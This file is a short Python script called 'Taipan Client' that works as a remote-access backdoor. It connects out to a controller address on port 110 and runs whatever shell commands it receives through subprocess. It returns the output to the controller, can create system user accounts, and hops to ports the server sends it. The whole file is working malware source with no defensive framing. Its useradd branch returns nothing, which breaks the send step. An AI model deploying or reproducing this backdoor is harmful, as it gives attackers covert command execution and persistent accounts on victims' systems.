"""
Taipan Client

Author: Russell Harvey
"""

import socket
import subprocess
import time

BUFFER = 1024


def directive(command):
    parts = command.split()
    if parts[0] == "useradd":
        process = subprocess.Popen(['useradd', parts[1]],
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
    else:
        return subprocess.getoutput(command)


def main():
    ip = "0.0.0.0"
    port = 110
    while True:
        s = socket.socket()
        s.connect((ip, port))
        command = s.recv(BUFFER).decode()
        if command.lower() == "exit":
            break
        print(command)
        output = directive(command)
        s.send(output.encode())
        new_info = s.recv(BUFFER).decode()
        port = int(new_info)
        s.close()
        time.sleep(3)
    s.close()


main()
